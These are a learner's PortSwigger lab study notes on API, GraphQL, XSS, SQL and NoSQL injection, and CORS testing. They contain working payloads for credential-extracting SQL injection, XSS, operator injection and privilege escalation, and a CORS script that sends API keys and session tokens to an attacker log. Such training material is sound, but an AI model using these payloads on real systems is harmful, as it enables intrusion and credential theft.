<h1>PortSwigger academy</h1>

## Table of Contents
- [Portswigger labs](#Portswigger-labs)
- [API Pentesting](#API-Pentesting)
  - [GraphQL](#GraphQL)
- [XSS](#cross-site-scripting-xss)
- [SQL Injection](#SQL-injection)
  - [NoSQL Injection](#NoSQL-injection)
- [CORS](#CORS)

## Portswigger labs

<h3>Lab link: https://portswigger.net/web-security/all-labs</h3>

## <h2>API Pentesting</h2>

<h3>API Enumeration</h3> 

 web fuzzing using **Burp Scanner** (alternative way is web fuzzer such as Feroxbuster or OWASP ZAP)

| API Endpoint Enumeration  | Method |
| ------------- | ------------- |
| Burp Scanner  | automation process  |
| Read API doc  | usually in /api directory  |
| Hidden API endpoint | Burp intruder or Gobuster |


It is also worth checking on JSON, YAML or any JavaScript files as it may contain API endpoints.

| HTTP Method  | Desc. |
| ------------- | ------------- |
| GET  | request resources  |
| POST  | submit requests  |
| Patch | update or modify |



When constructing a request, the JSON format is usually look like this in Burp Suite

```
{
  "username": tester,
  "password": tester
}
```

<h3>Identifying supported HTTP methods</h3>

Basically use **OPTIONS** to see available HTTP options. In HTB, this technique is called **HTTP Tampering** 

<h3>Type Confusion</h3>

The web server sometimes interprets the request differently if the content type isn't what it expect to be.

Usually it involves around **content-type**

```
Example

Content-type: Application/json

This tells the web server, this request contains JSON data
```

<h3>Hidden API endpoint</h3>

Let say you found 
```
POST /api/user/add
```

You can try to fuzzing other endpoint in **/add** using wordlists. You might find other endpoints that look like **/api/user/delete**, **/api/user/update** etc using **Burp Intruder**.

<h3>Mass Assignment Vulnerability</h3>

This attack allows the attackers to insert unknown data parameters in hidden parameters.

```
{
    "id": 123,
    "name": "John Doe",
    "email": "john@example.com",
    "isAdmin": "false"
}
```

<h3>Server-side parameter pollution</h3>

This attacks allows the attackers to inject payload in input which later on will be sent to internal system where external users couldnt access. If the input isn't sanitize, it could lead to unauthorized access.It is worth checking every input in API endpoints. We could use query syntax like #, &, = to test.

**Test scenario**
```
GET /userSearch?name=peter&back=/home
```

Use **#** to test. **%23** is the encoded format of #

```
GET /userSearch?name=peter%23foo&back=/home
```

**How website process request through URL path vs API?**

![image](https://github.com/user-attachments/assets/46627c6a-ceb5-450a-93b9-d21ec38353bf)

**Path Traversal in API**

```
GET /edit_profile.php?name=peter%2f..%2fadmin
```

if name parameter isn't sanitize, the web server coould interpret it as **name=peter/../admin**. This /../ is like cd i think.

<h3>Server-side pollution with structured data</h3>

```
POST /myaccount
name=peter","access_level":"administrator
```

We can try to add **access_level** parameter to escalate privielge.

in case it is in JSON 

```
POST /myaccount
{"name": "peter\",\"access_level\":\"administrator"}
```

<h1>We can use Burp Pro feature to automate the process!</h1>


<h1>Resources</h1>

API endpoint wordlists - https://github.com/chrislockard/api_wordlist

Server-Side Prototype Pollution Scanner - https://portswigger.net/blog/server-side-prototype-pollution-scanner

<h1>Recap & keywords</h1>

1. API enumeration = /api, API doc, Burp Scanner

2. API request enumeration = HTTP tampering, OPTIONS

3. Hidden API endpoints = POST /api/user/??? use Burp intruder

4. Server-side Pollution = try query syntax such as & # = in every parameter. For example **name=eheh&name=eheheh**, Server-Side Prototype Pollution Scanner, access_level=administrator etc

## <h2>GraphQL</h2>

**Trick: GraphQL uses the same endpoints for all requests. This means if you found 1 GraphQL API endpoint you can find the rest API endpoints!**

When we encounter GraphQL, the first thing we need to do it find its endpoint! 

The following query is a universal query for GraphQL

```
query{__typename}
```

so when this query is called the JSON data usually look like this 

```
{ "data": {"__typename": "query"} }
```

Basically a nested JSON parameter. Every GraphQL JSON query always has **__typename**.

When we want to verify GraphQL, we can try these following:

```
/graphql
/api
/api/graphql
/graphql/api
/graphql/graphql
```

**Note: When you have tried the above endpoints and couldn't find the endpoint, you may try /v1**

**Note2: GraphQL usually responds to non-GraphQL request with "query not present" or something similar.**

<h3>Exploit IDOR or BAC via unsanitized query input</h3>

Usually if the web app uses GraphQL for accessing data, we can play with query. This query sometimes unsanitizes which allows us to access resources.

**GraphQL checked, unsanitized checked. What's next?**

We can use "introspection". It is a built-in GraphQL function which spits out information like API docs and description. These informations are considered a sensitive information. Using:

```
{
        "query": "{__schema{queryType{name}}}"
    }
```

if the introspection doesn't retrieve the schema, try removeing **onOperation**, **onFragment**,and **onField**

if **Introspection is disabled**, we can try built-in suggestions function. This is an alternative way to exploit GraphQL information schema(in this scenario these schema are sensitive data).

**GraphQL exploitation in a nutshell**

Firstly, check that the web app i using GraphQL through requests.

Secondly, after verified the web app is using GraphQL, you can use Burp to perform information schema scanner.

Thirdly, read the schema and find sensitive query, then in the request, you add that sensitiv query to uncover the secret!

Example.

1. check for GraphQL(very easy to detect)

![image](https://github.com/user-attachments/assets/4f1c03cf-7b55-420f-a97a-dc26d8a9a60d)

2. check for Introspection function. if it enables then you can search information schema

![image](https://github.com/user-attachments/assets/35d9fac4-9179-4f8b-87bb-2ab7b69d28d2)

3. next, in the login page. let's inspect the GraphQL query using inQL extension

![image](https://github.com/user-attachments/assets/5e9d6e7d-597e-4f37-93f1-4492a4e749de)

4. As you can see, getUser query is being called during authentication. Now we can try to copy & paste this query in login request adn change id = 1 since the first id is admin

![image](https://github.com/user-attachments/assets/109ecad3-3815-4e5e-81a1-4b044cb014ce)

Easy peasy. The key point is to learn how query work in information schema!


------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


## <h2>Cross-site Scripting (XSS)</h2>

Reflected XSS, where the malicious script comes from the current HTTP request.

Stored XSS, where the malicious script comes from the website's database.

DOM-based XSS, where the vulnerability exists in client-side code rather than server-side code.

<h2>Automated tool with Burp Pro Vulnerability Scanner feature</h2>

Details: https://portswigger.net/burp/vulnerability-scanner

<h2>Content security policy</h2>

Content security policy or CSP is used to detect XSS.

DOM-based XSS 

Let say 

```
<img src="/resources/images/tracker.gif?searchTerms=">
```

We can try to create img script tag by 

```
"><svg onload=alert(1)> 
```

So, it will look like this

```
<img src="/resources/images/tracker.gif?searchTerms="><svg onload=alert(1)>
```
Basically just another tag in HTML


<h1>Resources</h1>

XSS cheatsheet - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## <h2>SQL Injection</h2>

Can be found especially in queries

Useful command when we want to know more about table information.

```
SELECT * FROM information_schema.tables
```

If you want to see tables you can try to exploit it with union-based sql injection.

```
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```

In case we want to retreive tables more than one, we can use concatenation to achieve that.

```
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```

<h3>How to test SQL injection</h3>

Use ' = if there is SQL error message, this means the web app is vulnerable to SQL injection

Ex.

```
https://insecure-website.com/products?category=Gifts'--
```

This means that the statement after -- will be recognized as a comment. In this case the only part that SQL statement will be execute is ?category=Gift

```
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

**Boolean conditions** checks for conditions

try

```
OR 1=1 # this always returns true
```

or

```
OR 1=2 
```

<h1>THE EASIEST WAY TO DETECT SQL INJECTION IS TO USE BURP SCANNER!</h1>

**Union Injection**

**How to check for database information?**

| Database  | Command |
| ------------- | ------------- |
| Microsoft, MySQL  | SELECT @@version |
| Oracle |SELECT * FROM v$version |
| PostgreSQL | SELECT version() |


Basically retrieve the another table by using UNION. It allows attackers to use SELECT command twice.

```
' UNION SELECT username, password FROM users--
```

Normally, when we test union injection. Firstly, check how many columns the table have. Secondly check which column has a suitable datatype. so that we can use SQL statement to retreive the respective data we want to expose.

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

another way

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

**In Oracle database**

We have to add **DUAL** after SELECT / FROM because it is a bult-in. Can't run without it.

```
' UNION SELECT NULL FROM DUAL--
```

**Oracle SQL injection exaple**

```
Accessories'+UNION+SELECT+banner,NULL+FROM+v$version--
```

<h2>WAF Bypass</h2>

We can encode or we can obfuscate the sql statement to bypass the WAF.

Ex. The below is XML-based SQL injection

```
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```

If we want to bypass specific technology, Burp suite provides many extension to help us bypass WAF. For example, if we want to bypass WAF that is implemented in XML, we can use Hackvertor extension to encode our SQL injection command to potentially bypass WAF.



**Out-of-band application security testing (OAST)**

This attacks uses external service to retreive SQL injection attack results. In Burp Suite, it has a dedicated testing server which allows users to perform OOB. This is useful when perform blind sql injection

the SQL injection might work but it doesn't show an error. We can use time delay to identify that or add additional logic condition to trigger an error.

```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```

The above cookie is a tracking cookie. This cookie is vulnerable to SQL injection since the value of TrackingID is basically SQL statement. However, we couldnt simply use union to exploit this instead we use blind sql injection.

Example

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

The above sql statement checks for administrator in Users table with the logic 1 = 1 is always true. if it is valid then it is greater than m. This means that as long as the welcome back notification is triggered. the result is positive. Now we know the first character of this user's password we can try

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```

This time the welcome back notification didn't show up. This means that the letter t isn't the 2nd character of the user's password. Now we try "s".

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 's
```

This time it returns a welcome back message, indicating valid statement.

In conclusion, so far we that this user's password is start with "m" and the second letter is "s". we repeat the process until we found a valid password.


## <h2>NoSQL Injection</h2>

A famouse database. It is different from traditional databases because it uses different query languages. 

Because of the variety of query that's why we can abuse many query syntax as there are many diffrent methods we can try.

**How do we test NoSQL injection?**

the concept is as the same as how we try to exploit sql injection

try:

```
'"`{
;$Foo}
$Foo \xYZ
```

in JSON query try:

```
'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
```

**NoSQL statement check**

False statement

```
Gifts' && 0 && 'x
```

True statement

```
Gifts' && 1 && 'x
```

Always true

```
Gifts'||1||'
```

We can also try to add null value. This works like a comment.

```
'%00
```

The result of null value is whatever statement after null value won't be processed. That's how MongoDB intreprets

**NoSQL injection with Operator Injection**


| Operator  | Meaning |
| ------------- | ------------- |
| $where  | Matches documents that satisfy a JavaScript expression. |
| $ne  |Matches all values that are not equal to a specified value. |
| $in | Matches all of the values specified in an array. |
| $regex | Selects documents where values match a specified regular expression. |

To exploit NoSQL Operator Injection, we can try nested objects.

In JSON

**{"username":"wiener"} becomes {"username":{"$ne":"invalid"}}**

In URL path

**username[$ne]=invalid**

<h3>Things to do if URL path doesn't work:</h3>

1. HTTP tampering. Change GET to POST
2. Change the content-type to Application/json
3. Do it in JSON query

<h3>I won't go deeper like how to manual exploit this. The reason is i just want to know how it work and how can i detect it. If i want to exploitm i will use automating tool </h3>

<h1>Resources</h1>

SQL injection cheatsheet - https://portswigger.net/web-security/sql-injection/cheat-sheet

NoSQL automating tool - https://github.com/codingo/NoSQLMap


------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## <h2>CORS</h2>

CORS or cross origin resource sharing is a browser mechanism, allowing the web app to use resource across domains. However, if this browser mechanism isn't well implemented, it could become an attacker vector.

SOP or same origin policy is a stricted origin policy. It allows a domain to request to other domains but it couldn't interact with resources.

**The vulnerability lies in the CORS misconfiguration**

How can we know the web app is vulnerable to CORS attack?

We can look at the response request, if the request contains **Access-Control-Allow-Credentials: true**, it uses CORS. Furthurmore, This header allows users to pass credentials in the request as well.

![image](https://github.com/user-attachments/assets/7f428fa4-1228-4214-97ad-7317d560c31e)

Example

If the web app is indeed vulnerable, we add Origin: anything and observe the response request.

```
GET /accountDetails HTTP/2
Host: 0a7e002a0386c18a826a063b003d00cb.web-security-academy.net
Cookie: session=HeU2poPXNDfV1PVYHZUs1y64nKtb5iND
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not?A_Brand";v="99", "Chromium";v="130"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.59 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a7e002a0386c18a826a063b003d00cb.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
Origin: https://google.com
```

Response request

```
HTTP/2 200 OK
Access-Control-Allow-Origin: https://google.com
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149
{
  "username": "wiener",
  "email": "",
  "apikey": "rgP0rUMKyM1EKlPJomojHMsmxeQChdH9",
  "sessions": [
    "HeU2poPXNDfV1PVYHZUs1y64nKtb5iND"
  ]
}
```

What happened here is that when we add the "Origin" header and the web app return the origin source as the trusted source. This becomes a problem because this web app trust any origin source from 3rd parties and subdomains.

**Script example**

```
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```


Trusted subdomains also vulnerable to cors attack. If attackers found any one of subdomains that are vulnerable to XSS. They can use those subdomains as origin source and embed script in the request in the form of XHR script.

<h3>CORS attack scenario in a nutshell</h3>

Let say you make a request and the response request has **Access-Control-Allow-Credentials: true**. The firs assumption is this web app is using CORS. CORS is there to make a request from external 3rd party API and subdomains. Next, we can use burp suite ro request another request but this time with **Origin: URL**. If it works you will see our origin url in the response request. Now, we are certain that this is vulnerable. Because of **Access-Control-Allow-Credentials: true** we can embed a javascript script to steal API, session token to the attacker's machine using XHR. XHR is API that allows users to use script in HTML. The attacker also needs their webserver running with js script that is waiting for the API token from the request and then save it in let say log.txt or whatever file that specified in the js script. Basically XSS in XHR. 

<h3>Mitigation</h3>

-Use whitelists. all subdomains should be listed in this whitelist as a trusted source. And make sure none of the subdomains have XSS vulnerabilities.

-Never used CORS as a security policies as its machanism is intended for using 3rd parties resources.

-Don't use null or wildcards in CORS.

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


